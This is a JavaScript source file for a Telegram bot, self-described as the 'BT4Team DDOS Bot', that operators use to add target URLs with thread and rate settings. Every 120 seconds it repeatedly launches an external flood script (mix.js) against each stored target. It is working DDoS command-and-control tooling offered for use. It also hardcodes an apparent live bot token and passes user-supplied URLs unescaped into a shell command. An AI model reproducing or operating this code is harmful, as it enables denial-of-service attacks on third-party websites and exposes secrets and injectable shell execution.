const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');
const fs = require('fs');

// Ganti dengan token bot Telegram Anda
const token = '8350237559:AAG3hlMvJfmYCEUTihBaMdCzUBuCCxNS1v0';

// Inisialisasi bot dengan token
const bot = new TelegramBot(token, { polling: true });

// File JSON untuk menyimpan data
const DATA_FILE = 'urls.json';

// Array username yang diizinkan
const AUTHORIZED_USERNAMES = ['bluetriple4'];

// Fungsi untuk membaca data dari file JSON
function readData() {
  try {
    if (fs.existsSync(DATA_FILE)) {
      const data = fs.readFileSync(DATA_FILE);
      return JSON.parse(data);
    }
    return [];
  } catch (error) {
    console.error(`Error reading JSON: ${error.message}`);
    return [];
  }
}

// Fungsi untuk menyimpan data ke file JSON
function saveData(data) {
  try {
    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
  } catch (error) {
    console.error(`Error writing JSON: ${error.message}`);
  }
}

// Fungsi untuk mencatat aktivitas penggunaan bot di console log
function logActivity(msg) {
  const user = msg.from;
  const chat = msg.chat;
  const command = msg.text;

  console.log(`┌─ Aktivitas Penggunaan Bot Telegram ─┐`);
  console.log(`│ User ID: ${user.id}`);
  console.log(`│ Username: ${user.username || 'Tidak ada'}`);
  console.log(`│ First Name: ${user.first_name || 'Tidak ada'}`);
  console.log(`│ Last Name: ${user.last_name || 'Tidak ada'}`);
  console.log(`│ Chat ID: ${chat.id}`);
  console.log(`│ Perintah: ${command}`);
  console.log(`│ Waktu: ${new Date().toLocaleString()}`);
  console.log('└─────────────────────────────────────┘');
}

// Fungsi untuk mengeksekusi mix.js
function executeMix(url, time, thread, rate) {
  return new Promise((resolve, reject) => {
    exec(`node mix.js ${url} ${time} ${thread} ${rate}`, (error, stdout, stderr) => {
      if (error) {
        console.error(`Error executing mix.js: ${error.message}`);
        resolve(`Error: ${error.message}`);
        return;
      }
      if (stderr) {
        console.error(`stderr: ${stderr}`);
        resolve(`stderr: ${stderr}`);
        return;
      }
      console.log(`stdout: ${stdout}`);
      resolve(stdout);
    });
  });
}

// Objek untuk menyimpan status pengeditan dan penambahan
const userState = {};

// Fungsi untuk menjalankan eksekusi otomatis 3 kali setiap 120 detik
function startAutoExecution() {
  setInterval(async () => {
    const data = readData();
    if (data.length > 0) {
      console.log(`┌─ Auto execution started for ${data.length} entries at ${new Date().toLocaleString()} ─┐`);
      
      // Eksekusi 3 kali dengan interval 40 detik
      for (let round = 1; round <= 3; round++) {
        console.log(`│ ── Round ${round}/3 ──`);
        
        for (const entry of data) {
          try {
            await executeMix(entry.url, 120, entry.thread, entry.rate);
            console.log(`│ ✓ Round ${round} executed: ${entry.url}`);
          } catch (error) {
            console.error(`│ ✗ Round ${round} failed for ${entry.url}: ${error.message}`);
          }
        }
        
        // Tunggu 40 detik sebelum round berikutnya (kecuali round terakhir)
        if (round < 3) {
          await new Promise(resolve => setTimeout(resolve, 40000));
        }
      }
      
      console.log('└─ Auto execution completed ─┘');
    }
  }, 120000); // 120 detik
}

// Fungsi untuk memeriksa apakah user diotorisasi
function isAuthorized(username) {
  return AUTHORIZED_USERNAMES.includes(username);
}

// Fungsi untuk membuat keyboard inline untuk manage
function createManageKeyboard(data) {
  const keyboard = [];
  
  data.forEach((entry, index) => {
    keyboard.push([
      { text: `✏️ Edit ${index + 1}`, callback_data: `edit_${index}` },
      { text: `🗑️ Delete ${index + 1}`, callback_data: `delete_${index}` }
    ]);
  });
  
  keyboard.push([{ text: '❌ Cancel', callback_data: 'cancel' }]);
  
  return {
    reply_markup: {
      inline_keyboard: keyboard
    }
  };
}

// Mulai eksekusi otomatis
startAutoExecution();
console.log('┌─ Bot Status ─┐');
console.log('│ Bot is running and listening for messages...');
console.log(`│ Authorized users: ${AUTHORIZED_USERNAMES.join(', ')}`);
console.log('│ Auto execution: 3x every 120 seconds');
console.log('└──────────────┘');

// Event listener untuk callback queries (inline buttons)
bot.on('callback_query', (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const messageId = callbackQuery.message.message_id;
  const data_callback = callbackQuery.data;
  const username = callbackQuery.from.username;

  // Memeriksa otorisasi
  if (!isAuthorized(username)) {
    bot.answerCallbackQuery(callbackQuery.id, { text: '❌ You are not authorized.' });
    return;
  }

  if (data_callback === 'cancel') {
    delete userState[chatId];
    bot.editMessageText('❌ Operation cancelled.', {
      chat_id: chatId,
      message_id: messageId
    });
    bot.answerCallbackQuery(callbackQuery.id);
    return;
  }

  if (data_callback.startsWith('edit_')) {
    const index = parseInt(data_callback.split('_')[1]);
    const data = readData();
    
    if (index >= 0 && index < data.length) {
      userState[chatId] = { 
        action: 'edit', 
        index: index, 
        step: 'url',
        originalData: { ...data[index] }
      };
      
      bot.editMessageText(
        `┌─ Editing Entry ${index + 1} ─┐\n` +
        `│ Current URL: ${data[index].url}\n` +
        `└─────────────────────────────┘\n\n` +
        `📝 Please enter the new URL:`,
        {
          chat_id: chatId,
          message_id: messageId
        }
      );
    }
    bot.answerCallbackQuery(callbackQuery.id);
  }

  if (data_callback.startsWith('delete_')) {
    const index = parseInt(data_callback.split('_')[1]);
    const data = readData();
    
    if (index >= 0 && index < data.length) {
      const deletedEntry = data[index];
      data.splice(index, 1);
      saveData(data);
      
      bot.editMessageText(
        `┌─ Entry Deleted Successfully ─┐\n` +
        `│ URL: ${deletedEntry.url}\n` +
        `│ Thread: ${deletedEntry.thread}\n` +
        `│ Rate: ${deletedEntry.rate}\n` +
        `└─────────────────────────────┘`,
        {
          chat_id: chatId,
          message_id: messageId
        }
      );
    }
    bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Entry deleted successfully.' });
  }
});

// Event listener untuk pesan dari pengguna
bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const command = msg.text;
  const username = msg.from.username;

  // Mencatat aktivitas penggunaan bot di console log
  logActivity(msg);

  // Cancel current operation if user starts new command
  if (command.startsWith('/') && userState[chatId]) {
    delete userState[chatId];
  }

  // Handle user states untuk add dan edit
  if (userState[chatId]) {
    const state = userState[chatId];

    // Handle ADD process
    if (state.action === 'add') {
      if (state.step === 'url') {
        const url = msg.text.trim();
        
        // Validasi basic URL
        if (!url.startsWith('http://') && !url.startsWith('https://')) {
          bot.sendMessage(chatId, '❌ Invalid URL format. URL must start with http:// or https://\n\n📝 Please enter a valid URL:');
          return;
        }

        // Cek apakah URL sudah ada
        const data = readData();
        const existingUrl = data.find(entry => entry.url === url);
        if (existingUrl) {
          bot.sendMessage(chatId, '⚠️ This URL already exists in the database.\n\n📝 Please enter a different URL:');
          return;
        }

        state.url = url;
        state.step = 'thread';
        bot.sendMessage(chatId, `┌─ URL Set ─┐\n│ ${url}\n└───────────┘\n\n🔢 Please enter the thread:`);
        return;
      }

      if (state.step === 'thread') {
        const thread = msg.text.trim();
        
        if (isNaN(thread) || parseInt(thread) <= 0) {
          bot.sendMessage(chatId, '❌ Thread must be a positive number.\n\n🔢 Please enter a valid thread count:');
          return;
        }

        state.thread = thread;
        state.step = 'rate';
        bot.sendMessage(chatId, `┌─ Configuration ─┐\n│ URL: ${state.url}\n│ Thread: ${thread}\n└─────────────────┘\n\n⚡ Please enter the rate:`);
        return;
      }

      if (state.step === 'rate') {
        const rate = msg.text.trim();
        
        if (isNaN(rate) || parseInt(rate) <= 0) {
          bot.sendMessage(chatId, '❌ Rate must be a positive number.\n\n⚡ Please enter a valid rate:');
          return;
        }

        const data = readData();
        data.push({ 
          url: state.url, 
          thread: state.thread, 
          rate: rate 
        });
        saveData(data);

        bot.sendMessage(chatId, 
          `┌─ Entry Added Successfully ─┐\n` +
          `│ URL: ${state.url}\n` +
          `│ Thread: ${state.thread}\n` +
          `│ Rate: ${rate}\n` +
          `└─────────────────────────────┘\n\n` +
          `🚀 Running DDOS Attack.`
        );

        delete userState[chatId];
        return;
      }
    }

    // Handle EDIT process
    if (state.action === 'edit') {
      const data = readData();
      
      if (state.step === 'url') {
        const url = msg.text.trim();
        
        // Validasi basic URL
        if (!url.startsWith('http://') && !url.startsWith('https://')) {
          bot.sendMessage(chatId, '❌ Invalid URL format. URL must start with http:// or https://\n\n📝 Please enter a valid URL:');
          return;
        }

        // Cek apakah URL sudah ada (kecuali yang sedang diedit)
        const existingUrl = data.find((entry, index) => entry.url === url && index !== state.index);
        if (existingUrl) {
          bot.sendMessage(chatId, '⚠️ This URL already exists in the database.\n\n📝 Please enter a different URL:');
          return;
        }

        data[state.index].url = url;
        state.step = 'thread';
        bot.sendMessage(chatId, `┌─ New URL Set ─┐\n│ ${url}\n│ Current Thread: ${data[state.index].thread}\n└───────────────┘\n\n🔢 Please enter the new thread:`);
        return;
      }

      if (state.step === 'thread') {
        const thread = msg.text.trim();
        
        if (isNaN(thread) || parseInt(thread) <= 0) {
          bot.sendMessage(chatId, '❌ Thread must be a positive number.\n\n🔢 Please enter a valid thread:');
          return;
        }

        data[state.index].thread = thread;
        state.step = 'rate';
        bot.sendMessage(chatId, `┌─ Configuration ─┐\n│ URL: ${data[state.index].url}\n│ Thread: ${thread}\n│ Current Rate: ${data[state.index].rate}\n└─────────────────┘\n\n⚡ Please enter the new rate:`);
        return;
      }

      if (state.step === 'rate') {
        const rate = msg.text.trim();
        
        if (isNaN(rate) || parseInt(rate) <= 0) {
          bot.sendMessage(chatId, '❌ Rate must be a positive number.\n\n⚡ Please enter a valid rate:');
          return;
        }

        data[state.index].rate = rate;
        saveData(data);

        bot.sendMessage(chatId, 
          `┌─ Entry Updated Successfully ─┐\n` +
          `│ URL: ${data[state.index].url}\n` +
          `│ Thread: ${data[state.index].thread}\n` +
          `│ Rate: ${rate}\n` +
          `└───────────────────────────────┘`
        );

        delete userState[chatId];
        return;
      }
    }
  }

  // Menanggapi perintah /start
  if (command.toLowerCase() === '/start') {
    const welcomeMessage = 
      `┌─ Welcome to BT4Team DDOS Bot ─┐\n` +
      `│ This bot attack ddos to hosts.\n` +
      `└───────────────────────────────┘\n\n` +
      `📋 Available Commands:\n` +
      `├─ /start - Show this welcome message\n` +
      `├─ /add - Add new URL/Host to attack\n` +
      `└─ /manage - Manage Attacked URLs/Hosts\n\n` +
      `⚡ DDOS:\n` +
      `The DDoS attack will be running before it's deleted from the bot.\n\n` +
      `🔐 Access Control:\n` +
      `Commands /add and /manage are restricted to authorized users.`;
    
    bot.sendMessage(chatId, welcomeMessage);
    return;
  }

  // Memeriksa apakah pengguna adalah yang diotorisasi untuk perintah /add dan /manage
  if ((command.startsWith('/add') || command.startsWith('/manage')) && !isAuthorized(username)) {
    bot.sendMessage(chatId, '❌ You are not authorized to use this command.');
    return;
  }

  // Menanggapi perintah /add
  if (command === '/add') {
    userState[chatId] = { 
      action: 'add', 
      step: 'url' 
    };
    bot.sendMessage(chatId, '┌─ Add New Entry ─┐\n│ Step 1/3\n└─────────────────┘\n\n📝 Please enter the URL:');
    return;
  }

  // Handle /add dengan parameter (backward compatibility)
  if (command.startsWith('/add ')) {
    const args = command.trim().split(' ');
    
    if (args.length !== 4) {
      bot.sendMessage(chatId, '❌ Invalid format. Use /add without parameters for step-by-step input.\n\nAlternatively, use: /add [url] [thread] [rate]\n\nExample: /add https://example.com 443 9');
      return;
    }
    
    const url = args[1];
    const thread = args[2];
    const rate = args[3];

    // Validasi basic URL
    if (!url.startsWith('http://') && !url.startsWith('https://')) {
      bot.sendMessage(chatId, '❌ URL must start with http:// or https://');
      return;
    }

    // Validasi thread dan rate adalah angka
    if (isNaN(thread) || isNaN(rate) || parseInt(thread) <= 0 || parseInt(rate) <= 0) {
      bot.sendMessage(chatId, '❌ Thread and rate must be positive numbers.');
      return;
    }

    const data = readData();
    
    // Cek apakah URL sudah ada
    const existingUrl = data.find(entry => entry.url === url);
    if (existingUrl) {
      bot.sendMessage(chatId, '⚠️ This URL already exists in the database.');
      return;
    }
    
    data.push({ url, thread, rate });
    saveData(data);
    
    bot.sendMessage(chatId, 
      `┌─ Entry Added Successfully ─┐\n` +
      `│ URL: ${url}\n` +
      `│ Thread: ${thread}\n` +
      `│ Rate: ${rate}\n` +
      `└─────────────────────────────┘\n\n` +
      `🚀 Running DDOS Attack.`
    );
    return;
  }

  // Menanggapi perintah /manage
  if (command === '/manage') {
    // Cancel any ongoing operation
    if (userState[chatId]) {
      delete userState[chatId];
    }
    
    const data = readData();
    if (data.length === 0) {
      bot.sendMessage(chatId, '┌─ No Data Found ─┐\n│ No stored data found.\n│ Use /add to add your first URL.\n└─────────────────┘');
      return;
    }

    let response = '┌─ Stored URLs/Hosts ─┐\n';
    data.forEach((entry, index) => {
      response += `│ ${index + 1}. URL: ${entry.url}\n│    Thread: ${entry.thread}\n│    Rate: ${entry.rate}\n`;
      if (index < data.length - 1) response += '├─────────────────\n';
    });
    response += '└─────────────────────┘\n\n🔧 Select an action:';
    
    bot.sendMessage(chatId, response, createManageKeyboard(data));
    return;
  }

  // Handle unknown commands
  if (command.startsWith('/')) {
    bot.sendMessage(chatId, '❓ Unknown command. Use /start to see available commands.');
  }
});

// Error handler
bot.on('error', (error) => {
  console.error('┌─ Bot Error ─┐');
  console.error(`│ ${error}`);
  console.error('└─────────────┘');
});

// Polling error handler
bot.on('polling_error', (error) => {
  console.error('┌─ Polling Error ─┐');
  console.error(`│ ${error}`);
  console.error('└──────────────────┘');
});

console.log(`┌─ Initialization Complete ─┐`);
console.log(`│ Auto execution: 3x per 120s`);
console.log(`└───────────────────────────┘`);